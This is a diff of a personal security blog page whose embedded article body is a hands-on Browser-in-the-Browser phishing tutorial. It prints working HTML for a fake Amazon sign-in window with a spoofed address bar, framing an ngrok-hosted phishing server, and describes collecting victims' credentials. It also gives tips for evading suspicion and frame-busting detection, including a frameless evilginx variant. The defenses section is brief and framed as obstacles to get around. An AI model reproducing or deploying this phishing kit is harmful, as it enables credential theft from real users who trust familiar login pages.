@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Browser-in-the-Browser (BitB) attack | Journal of Connar</title>
 <meta name="keywords" content="BitB">
 <meta name="description" content="What is the Browser-in-the-Browser attack
 BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.
 Basically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.">
 <meta name="author" content="connar">
-<link rel="canonical" href="http://localhost:1313/posts/bitb/">
+<link rel="canonical" href="https://connar.github.io/posts/bitb/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://connar.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/bitb/">
+<link rel="alternate" hreflang="en" href="https://connar.github.io/posts/bitb/">
 <noscript>
     <style>
         #theme-toggle,
@@ -57,7 +57,75 @@ Basically, the concept of this attack is to host a phishing website and inside t
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="Browser-in-the-Browser (BitB) attack" />
+<meta property="og:description" content="What is the Browser-in-the-Browser attack
+BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.
+Basically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connar.github.io/posts/bitb/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-11T20:03:02+02:00" />
+<meta property="article:modified_time" content="2024-03-11T20:03:02+02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Browser-in-the-Browser (BitB) attack"/>
+<meta name="twitter:description" content="What is the Browser-in-the-Browser attack
+BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.
+Basically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://connar.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Browser-in-the-Browser (BitB) attack",
+      "item": "https://connar.github.io/posts/bitb/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Browser-in-the-Browser (BitB) attack",
+  "name": "Browser-in-the-Browser (BitB) attack",
+  "description": "What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\n",
+  "keywords": [
+    "BitB"
+  ],
+  "articleBody": "What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\nHow does it work The way this attack works is that you host a phishing website, provide a login/signup page with usual platforms like “Continue with email”, “Continue with Facebook” etc and make the SSO window look legitimate (valid url) but the reality is that we will have control over that window to, because that window is fake as well.\nDemo To start off, we need to go to mr.d0x github page and get the template windows for this attack:\nhttps://github.com/mrd0x/BITB The files are just usual website files (html, css, js, icons). Example of a window before we modify it is the following: In the github repo, there are multiple templates based on the browser and the theme (dark / light). You need to know how the victim has configured his/her browser in order to use the right template so evade suspicions. You can either take a guess based on statistics (what is the most used theme) or write further code in the website to detect the theme and thus use the appropriate theme:\nhttps://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers Now that we have chosen a theme, let’s host a phishing website. I will go with blackeye one since I have made a post about it.\nWe first fire up our phishing website. It’s going to be an amazon one:\nAfterwards, we need to find the appropriate amazon.svg file and place it in the theme folder we are using. The final html page should be something like the following:\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e \u003clink rel=\"stylesheet\" href=\"style.css\"\u003e \u003cscript src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"window\"\u003e \u003cdiv id=\"title-bar-width\"\u003e \u003cdiv id=\"title-bar\"\u003e \u003cdiv style=\"margin-top:5px;\"\u003e \u003cimg src=\"./amazon.svg\" width=\"20px\" height=\"15px\" id=\"logo\"\u003e \u003cspan id=\"logo-description\"\u003ePlease log to your account.\u003c/span\u003e \u003c/div\u003e \u003cdiv\u003e \u003cspan id=\"minimize\"\u003e\u0026#8212;\u003c/span\u003e \u003cspan id=\"square\"\u003e□\u003c/span\u003e \u003cspan id=\"exit\"\u003e✕\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"url-bar\"\u003e \u003cimg src=\"./ssl.svg\" width=\"20px\" height=\"20px\" id=\"ssl-padlock\"\u003e \u003cspan id=\"domain-name\"\u003ehttps://www.amazon.com\u003c/span\u003e \u003cspan id=\"domain-path\"\u003e/signin.html\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003ciframe id=\"content\" src=\"https://44e5-46-177-73-144.ngrok-free.app\" frameBorder=\"0\"\u003e\u003c/iframe\u003e \u003c/div\u003e \u003c/body\u003e \u003cscript src=\"script.js\"\u003e\u003c/script\u003e \u003c/html\u003e The victim should now see the following window, which seems legitimate: Upon entering the credentials, we should see them in our server: We could also write code to forward the user to the real login of the website we mimiced and pass the given creds as parameters to avoid further suspicion.\nDefenses The way this attack was initially detected was by trying to drag the SSO window out of the browser window. If the SSO window was not able to escape the outter window, this meant that it was fake.\nLater on, a plugin came out that would identify such windows by the use of their iframes and warn users about this attack. This is done with a technique known as frame busting, a technique now used by most of the known browsers. This leads to BitB being heavily detected and can burn your phishing domain. In order to avoid BitB being detected, you must somehow heavily obfuscate/hide it.\nSo if we somehow managed to solve the defense mechanism that checks for iframes, we would have a successful BitB phishing attack, which brings us to the next section on how to implement this attack without iframes and with the help of evilginx.\nBitB without iframes In this technique, apache and evilginx is utilized alongside with many css and html tricks, avoiding the use of iframes and thus making a more complicated (“obfuscated”) approach that is not that easy to detect. As the developer of this developed technique stated in his github repo: Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page. This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect. We also use an additional trick called “Shadow DOM” in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.\nThe result is a fully working, undetected to framebusters SSO window using the bitb technique:\nThere are many things going on in frameless BitB but Wael Masri does a great job explaining the ins and outs of this technique and how you could replicate it:\nReferences\n[1] Mr.d0x: Browser In The Browser (BITB) Attack\r[2] Cofense email security: Browser-in-the-Browser (BitB) Attack Takes Advantage of Single-Sign-On Trust\r[3] Infinite Logins: Browser in the Browser (BITB) Phishing Technique\r[3] Wael Masri: How To: Evilginx + BITB | Browser In The Browser without iframes in 2024\r[4] waelmas: frameless-bitb\r",
+  "wordCount" : "844",
+  "inLanguage": "en",
+  "datePublished": "2024-03-11T20:03:02+02:00",
+  "dateModified": "2024-03-11T20:03:02+02:00",
+  "author":[{
+    "@type": "Person",
+    "name": "connar"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://connar.github.io/posts/bitb/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Journal of Connar",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://connar.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -75,7 +143,7 @@ Basically, the concept of this attack is to host a phishing website and inside t
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -101,42 +169,42 @@ Basically, the concept of this attack is to host a phishing website and inside t
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://connar.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://connar.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                     <span>My Challenges</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="https://connar.github.io/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://connar.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/training/" title="Training">
+                <a href="https://connar.github.io/training/" title="Training">
                     <span>Training</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://connar.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -147,7 +215,7 @@ Basically, the concept of this attack is to host a phishing website and inside t
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       Browser-in-the-Browser (BitB) attack
     </h1>
@@ -194,7 +262,7 @@ Basically, the concept of this attack is to host a phishing website and inside t
 <ul>
 <li><a href="https://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers">https://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers</a></li>
 </ul>
-<p>Now that we have chosen a theme, let&rsquo;s host a phishing website. I will go with blackeye one since I have made <a href="http://localhost:1313/posts/phishingsite/" title="blackeye post">a post about it</a>.<br>
+<p>Now that we have chosen a theme, let&rsquo;s host a phishing website. I will go with blackeye one since I have made <a href="https://connar.github.io/posts/phishingsite/" title="blackeye post">a post about it</a>.<br>
 We first fire up our phishing website. It&rsquo;s going to be an amazon one:<br>
 <img loading="lazy" src="/posts/bitb/setup_phishingServer.png" alt="setup phishing website"  />
 </p>
@@ -269,7 +337,7 @@ So if we somehow managed to solve the defense mechanism that checks for iframes,
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/bitb/">BitB</a></li>
+      <li><a href="https://connar.github.io/tags/bitb/">BitB</a></li>
     </ul>
 
   </footer>
@@ -277,7 +345,7 @@ So if we somehow managed to solve the defense mechanism that checks for iframes,
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 
 
     <span>
         Powered by
